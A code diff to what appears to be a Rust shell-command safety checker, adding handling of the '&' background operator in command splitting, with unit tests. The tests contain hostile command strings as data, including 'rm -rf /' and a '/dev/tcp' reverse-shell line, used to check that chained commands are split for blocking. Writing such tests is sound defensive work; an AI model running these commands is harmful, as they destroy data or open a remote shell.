@@ -178,6 +178,18 @@ fn compound_split(command: &str) -> Vec<String> {
                 chars.next();
                 push_segment(&mut segments, &mut current);
             }
+            '&' if chars.peek() == Some(&'>') => {
+                // &> or &>> redirect — not a separator
+                current.push(c);
+            }
+            '&' if current.ends_with('>') => {
+                // >& redirect — not a separator
+                current.push(c);
+            }
+            '&' => {
+                // Background operator — treat as separator
+                push_segment(&mut segments, &mut current);
+            }
             '|' if chars.peek() == Some(&'|') => {
                 chars.next();
                 push_segment(&mut segments, &mut current);
@@ -708,5 +720,45 @@ mod tests {
     fn doas_bash_c_dynamic_gen() {
         let result = unwrap(r#"doas bash -c "$(evil)""#);
         assert_eq!(result.block, Some(BlockReason::DynamicGeneration));
+    }
+
+    // --- Background operator `&` splitting ---
+
+    #[test]
+    fn background_operator_splits_segments() {
+        let segs = compound_split("echo hi & rm -rf /");
+        assert_eq!(segs, vec!["echo hi", "rm -rf /"]);
+    }
+
+    #[test]
+    fn background_operator_no_space() {
+        let segs = compound_split("echo hi&rm -rf /");
+        assert_eq!(segs, vec!["echo hi", "rm -rf /"]);
+    }
+
+    #[test]
+    fn redirect_ampersand_gt_not_split() {
+        // &> is a redirect operator, not a separator
+        let segs = compound_split("cmd &> /dev/null");
+        assert_eq!(segs.len(), 1);
+    }
+
+    #[test]
+    fn redirect_gt_ampersand_not_split() {
+        // >& is a redirect operator (reverse shell pattern must stay intact)
+        let segs = compound_split("bash -i >& /dev/tcp/1.2.3.4/4444");
+        assert_eq!(segs.len(), 1);
+    }
+
+    #[test]
+    fn background_operator_in_quotes_not_split() {
+        let segs = compound_split("echo 'a & b'");
+        assert_eq!(segs.len(), 1);
+    }
+
+    #[test]
+    fn background_and_double_ampersand_mixed() {
+        let segs = compound_split("sleep 1 & echo ok && rm -rf /");
+        assert_eq!(segs, vec!["sleep 1", "echo ok", "rm -rf /"]);
     }
 }
